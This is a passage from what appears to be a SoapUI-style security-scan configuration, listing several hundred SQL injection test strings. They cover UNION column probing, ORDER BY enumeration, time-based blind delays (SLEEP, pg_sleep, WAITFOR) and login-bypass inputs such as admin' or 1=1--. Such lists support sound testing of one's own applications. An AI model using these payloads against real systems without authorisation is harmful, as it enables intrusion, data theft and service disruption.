ALL SELECT 'INJ'||'ECT'||'XXX',2--</con:sqlInjectionStrings><con:sqlInjectionStrings>or 1=1/*</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 17# </con:sqlInjectionStrings><con:sqlInjectionStrings>RANDOMBLOB(500000000/2)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 2-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 30-- </con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings><con:sqlInjectionStrings>1 AND (SELECT * FROM Users) = 1</con:sqlInjectionStrings><con:sqlInjectionStrings>1)) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings><con:sqlInjectionStrings>' or ''-'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 28# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 29-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>AnD SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#</con:sqlInjectionStrings><con:sqlInjectionStrings>")) or sleep(5)="</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>' or ''*'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--</con:sqlInjectionStrings><con:sqlInjectionStrings>1' GROUP BY 1,2,--+</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 17-- </con:sqlInjectionStrings><con:sqlInjectionStrings>RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 31337-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4</con:sqlInjectionStrings><con:sqlInjectionStrings>or true--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>-1 UNION SELECT 1 INTO @,@,@</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings><con:sqlInjectionStrings>-- -</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 15# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings><con:sqlInjectionStrings>') or true--</con:sqlInjectionStrings><con:sqlInjectionStrings>1 or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,3,1))='X'</con:sqlInjectionStrings><con:sqlInjectionStrings>-1 UNION SELECT 1 INTO @,@</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=0#</con:sqlInjectionStrings><con:sqlInjectionStrings>1' ORDER BY 2--+</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 26# </con:sqlInjectionStrings><con:sqlInjectionStrings>' OR 1 -- -</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,1,1))='M'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--</con:sqlInjectionStrings><con:sqlInjectionStrings>'='</con:sqlInjectionStrings><con:sqlInjectionStrings>' AnD SLEEP(5) ANd '1</con:sqlInjectionStrings><con:sqlInjectionStrings>or 1=1--</con:sqlInjectionStrings><con:sqlInjectionStrings>' or "</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#</con:sqlInjectionStrings><con:sqlInjectionStrings>";waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>AnD SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1083=1083 AND ('1427=1427</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=0-- </con:sqlInjectionStrings><con:sqlInjectionStrings>RANDOMBLOB(1000000000/2)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or "1"="1"#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 27-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings><con:sqlInjectionStrings>1' ORDER BY 3--+</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--</con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=0--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=0-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 15-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))</con:sqlInjectionStrings><con:sqlInjectionStrings>1' GROUP BY 1,2,3--+</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=0 AND '%'='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#</con:sqlInjectionStrings><con:sqlInjectionStrings>1*56</con:sqlInjectionStrings><con:sqlInjectionStrings>" or ""&amp;"</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),4#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 2# </con:sqlInjectionStrings><con:sqlInjectionStrings>or SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>&amp;&amp;SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' #</con:sqlInjectionStrings><con:sqlInjectionStrings>@@variable</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or ('1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or "1"="1"--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--</con:sqlInjectionStrings><con:sqlInjectionStrings>" or ""-"</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or '1'='1'/*</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9</con:sqlInjectionStrings><con:sqlInjectionStrings>pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings><con:sqlInjectionStrings>" or true--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>')) or sleep(5)='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings><con:sqlInjectionStrings>' or sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=0</con:sqlInjectionStrings><con:sqlInjectionStrings>;waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>;%00</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or 1=1--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 25-- </con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or "1"="1"/*</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or "1"="1</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9--</con:sqlInjectionStrings><con:sqlInjectionStrings>IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings><con:sqlInjectionStrings>") or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#</con:sqlInjectionStrings><con:sqlInjectionStrings>" or ""*"</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 18# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 4# </con:sqlInjectionStrings><con:sqlInjectionStrings>')) or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 16 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 13-- </con:sqlInjectionStrings><con:sqlInjectionStrings>" or "" "</con:sqlInjectionStrings><con:sqlInjectionStrings>");waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=0--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5</con:sqlInjectionStrings><con:sqlInjectionStrings>"^"</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 17 </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 2 </con:sqlInjectionStrings><con:sqlInjectionStrings>1) or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or "1"="1</con:sqlInjectionStrings><con:sqlInjectionStrings>AnD SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 18 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#</con:sqlInjectionStrings><con:sqlInjectionStrings>' or ''^'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT USER(),SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 20# </con:sqlInjectionStrings><con:sqlInjectionStrings>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT NULL</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 3 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings><con:sqlInjectionStrings>or benchmark(50000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 19 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or '1'='1'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>" or sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 8-- </con:sqlInjectionStrings><con:sqlInjectionStrings>&amp;&amp;SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or "1"="1"#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 6# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10</con:sqlInjectionStrings><con:sqlInjectionStrings>") or true--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 4 </con:sqlInjectionStrings><con:sqlInjectionStrings>waitfor delay '00:00:05'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#</con:sqlInjectionStrings><con:sqlInjectionStrings>\\</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings><con:sqlInjectionStrings>%' AND 8310=8311 AND '%'='</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 12 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 23-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#</con:sqlInjectionStrings><con:sqlInjectionStrings>' AND id IS NULL; --</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 5 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 13 </con:sqlInjectionStrings><con:sqlInjectionStrings>" "</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--</con:sqlInjectionStrings><con:sqlInjectionStrings>%' AND 8310=8310 AND '%'='</con:sqlInjectionStrings><con:sqlInjectionStrings>SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=0</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION 